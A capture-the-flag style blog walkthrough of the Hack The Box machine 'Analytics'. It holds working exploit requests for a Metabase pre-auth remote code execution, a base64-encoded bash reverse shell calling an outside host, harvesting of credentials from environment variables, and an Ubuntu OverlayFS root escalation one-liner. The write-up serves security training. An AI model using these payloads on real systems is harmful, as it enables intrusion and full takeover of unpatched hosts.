---
layout: post
title: Hack The Box Walkthrough - Analytics
date: 2024-03-23
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2024/03/HTB/Analytics
img: 2024/03/Analytics/Analytics.png
---

In this machine, I exploited a known vulnerability in Metabase to get a user, and a vulnerability in Ubuntu to become root.

* Room: Analytics
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/Analytics](https://app.hackthebox.com/machines/Analytics)
* Authors:
    * [7u9y](https://app.hackthebox.com/users/260996)
    * [TheCyberGeek](https://app.hackthebox.com/users/114053)

## Enumeration

I started by enumerating the open ports with Rustscan.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.50.251:22
Open 10.129.50.251:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-18 18:24 EST
NSE: Loaded 156 scripts for scanning.

...

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

...

Nmap done: 1 IP address (1 host up) scanned in 7.79 seconds
```

There were two open ports:
* 22 (SSH)
* 80 (HTTP)

The site on port 80 was redirecting to 'http://analytical.htb/'. I added the domain to my hosts file and checked for subdomains.

```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -X POST -t30 --hw 10 -H "Host:FUZZ.analytical.htb" "http://analytical.htb"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://analytical.htb/
Total requests: 648201

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000127079:   200        0 L      0 W        0 Ch        "data"

Total time: 1023.101
Processed Requests: 648201
Filtered Requests: 648200
Requests/sec.: 633.5646
```

It found 'data.analytical.htb. I added it to my hosts file. I ran `feroxbuster` on both domains to check for hidden pages. It did not find anything interesting.

## Main Website

I opened a web browser to check at the website on 'analytical.htb'.

![Main Website](/assets/images/2024/03/Analytics/AnalyticalWebsite.png "Main Website")

The site was very simple. It had a contact form, but it did not do anything. Same thing with newsletter subscription at the bottom. The login link took me to 'data.analytical.htb'.

## Metabase

The login page was an instance of [Metabase](https://www.metabase.com/). I tried a few common passwords with emails I saw in the main site. They did not work.

![Metabase Login](/assets/images/2024/03/Analytics/LoginForm.png "Metabase Login")

I looked at the page's source to find the version of Metabase.

```json
"version": {
    "date": "2023-06-29",
    "tag": "v0.46.6",
    "branch": "release-x.46.x",
    "hash": "1bb88f5"
},
```

It was using version v0.46.6. I quickly found that it had an [unauthenticated Remote Code Execution vulnerability](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/). There was a [POC](https://github.com/m3m0o/metabase-pre-auth-rce-poc), but the vulnerability was simple to exploit so I tried it directly in Caido.

First, I needed to get a token by sending a get request to '/api/session/properties'.

```http
GET /api/session/properties HTTP/1.1
Host: data.analytical.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: metabase.DEVICE=f1fc7d2a-89c9-4ca7-9e64-6fc1cb41ecea
Upgrade-Insecure-Requests: 1
```

It returned over 2000 lines of JSON, the token was near the bottom of it.

```json
{
    ...
    "landing-page": "",
    "setup-token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "application-colors": {},
    "enable-audit-app?": false,
    "anon-tracking-enabled": false,
    "version-info-last-checked": null,
    ...
}
```

Then it used the '/api/setup/validate' endpoint that validates the database URL. The exploit tries to use a 'zip' database and some SQL Injection to create a trigger and execute it when checking the connection to the database.

I tested the exploit by trying to load a web page from my machine. The exploit required base64 a encoded command.

```bash
$ echo -n "curl 10.10.14.82  " | base64
Y3VybCAxMC4xMC4xNC44MiAg
```

I sent the payload with that command.

```http
POST /api/setup/validate HTTP/1.1
Host: data.analytical.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Cookie: metabase.DEVICE=f1fc7d2a-89c9-4ca7-9e64-6fc1cb41ecea
Content-Type: application/json
Content-Length: 472

{
  "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
  "details": {
    "details": {
      "db": "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER JTNMEYESRPXS BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,Y3VybCAxMC4xMC4xNC44MiAg}|{base64,-d}|{bash,-i}')\n$$--=x",
      "advanced-options": "False",
      "ssl": "True"
    },
    "name": "x",
    "engine": "h2"
  }
}
```

My web server got a call.

```bash
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.35.98 - - [20/Jan/2024 15:49:04] "GET / HTTP/1.1" 200 -
```

I had confirmation that I could run code on the server. I used it to get a remote shell.

I encoded the command.

```bash
$ echo 'bash  -i >& /dev/tcp/10.10.14.82/4444 0>&1  ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuODIvNDQ0NCAwPiYxICAK
```

And I sent it to the server.

```http
POST /api/setup/validate HTTP/1.1
Host: data.analytical.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Cookie: metabase.DEVICE=f1fc7d2a-89c9-4ca7-9e64-6fc1cb41ecea
Content-Type: application/json
Content-Length: 508

{
  "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
  "details": {
    "details": {
      "db": "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER JTNMEYESRPXS BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuODIvNDQ0NCAwPiYxICAK}|{base64,-d}|{bash,-i}')\n$$--=x",
      "advanced-options": "False",
      "ssl": "True"
    },
    "name": "x",
    "engine": "h2"
  }
}
```

I was in.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.35.58] 34134
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
a5db4c9d41d3:/$ id
id
uid=2000(metabase) gid=2000(metabase) groups=2000(metabase),2000(metabase)
```

## Getting a User

Once connected, I looked at what I could do. I was in a Docker container without much privilege.

I found an [H2 database](https://h2database.com/html/main.html) that was used by the Metabase. I opened the file with vim and found some password hashes in it. I tried to crack them, but it failed.

```bash
a5db4c9d41d3:/metabase.db$ ls -l
ls -l
total 2968
-rw-r--r--    1 metabase metabase   3031040 Jan 20 16:12 metabase.db.mv.db
-rw-r--r--    1 metabase metabase      6248 Aug  3 12:17 metabase.db.trace.db
```

I found the script that launched the application.

```bash
d9f6315adea7:/$ ls /app
certs
metabase.jar
run_metabase.sh
```

The script appeared to read some environment variables. I checked if they contained anything interesting.

```bash
a5db4c9d41d3:/$ env
env
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=a5db4c9d41d3
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=REDACTED
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=4
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
```

It had some credentials. I used them to ssh to the machine.

```bash
$ ssh metalytics@target
metalytics@target's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jan 20 04:57:15 PM UTC 2024

  System load:              0.16259765625
  Usage of /:               93.3% of 7.78GB
  Memory usage:             25%
  Swap usage:               0%
  Processes:                152
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.129.35.58
  IPv6 address for eth0:    dead:beef::250:56ff:feb0:14b7

  => / is using 93.3% of 7.78GB


...

metalytics@analytics:~$ ls
user.txt

metalytics@analytics:~$ cat user.txt
REDACTED
```

## Getting Root

Once connected as a user, I had a hard time elevating my privileges to root. I began with the simple checks.

```bash
metalytics@analytics:~$ sudo -l
[sudo] password for metalytics:
Sorry, try again.
[sudo] password for metalytics:
Sorry, user metalytics may not run sudo on localhost.


metalytics@analytics:~$ find / -perm /u=s 2>/dev/null
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1

metalytics@analytics:~$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
```

I could not do anything with sudo and I did not find any binaries with special permission. I knew that machine was running Docker, but I could not run it with my user.

I checked if the server was listening to ports that were not open to the outside.

```bash
metalytics@analytics:/$ ss -tunl
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*
udp                     UNCONN                   0                        0                                          127.0.0.53%lo:53                                              0.0.0.0:*
tcp                     LISTEN                   0                        4096                                       127.0.0.53%lo:53                                              0.0.0.0:*
tcp                     LISTEN                   0                        511                                              0.0.0.0:80                                              0.0.0.0:*
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                              0.0.0.0:*
tcp                     LISTEN                   0                        4096                                           127.0.0.1:3000                                            0.0.0.0:*
tcp                     LISTEN                   0                        511                                                 [::]:80                                                 [::]:*
tcp                     LISTEN                   0                        128                                                 [::]:22                                                 [::]:*
```

It was listening to port 3000, but that was only the instance of Metabase. I uploaded [pspy](https://github.com/DominicBreuker/pspy) to check for running processes, but it did not find anything.

I also ran [LinPEAS](https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/README.md) on the server. I looked at the results a few times and I could not find anything to exploit.

![LinPEAS](/assets/images/2024/03/Analytics/LinPEAS.png "LinPEAS")

After a long time, I searched for exploits in the Ubuntu version. I quickly found a [CVE for it](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/). It used OverlayFS to mount a file system and run Python with the setuid capability.

I tried the POC.

```bash
metalytics@analytics:~$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
```

It worked, so I used the same technique to copy `bash` and make it `suid`.

```bash
metalytics@analytics:~$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /tmp/; chmod u+s /tmp/bash")'
mkdir: cannot create directory ‘l’: File exists
mkdir: cannot create directory ‘u’: File exists
mkdir: cannot create directory ‘w’: File exists
mkdir: cannot create directory ‘m’: File exists

metalytics@analytics:~$ ls -ltrh /tmp
total 1.4M
drwx------ 3 root       root       4.0K Jan 20 15:36 systemd-private-b0ef0bbaa3354ec2815aa91746b913f4-systemd-timesyncd.service-ZXXixc
drwx------ 3 root       root       4.0K Jan 20 15:36 systemd-private-b0ef0bbaa3354ec2815aa91746b913f4-systemd-resolved.service-NfUc7h
drwx------ 3 root       root       4.0K Jan 20 15:36 systemd-private-b0ef0bbaa3354ec2815aa91746b913f4-systemd-logind.service-9GMRMw
drwx------ 3 root       root       4.0K Jan 20 15:36 systemd-private-b0ef0bbaa3354ec2815aa91746b913f4-ModemManager.service-Y02l6g
drwx------ 2 root       root       4.0K Jan 20 15:37 vmware-root_427-1849560532
-rwxrwx--- 1 metalytics metalytics  16K Jan 20 18:09 rootshell
drwx------ 2 metalytics metalytics 4.0K Jan 20 18:13 tmux-1000
-rwsr-xr-x 1 root       metalytics 1.4M Jan 20 18:28 bash
```

Then I executed the copied `bash` to become root.

```bash
metalytics@analytics:~$ /tmp/bash -p
bash-5.1# whoami
root

bash-5.1# cat /root/root.txt
REDACTED
```
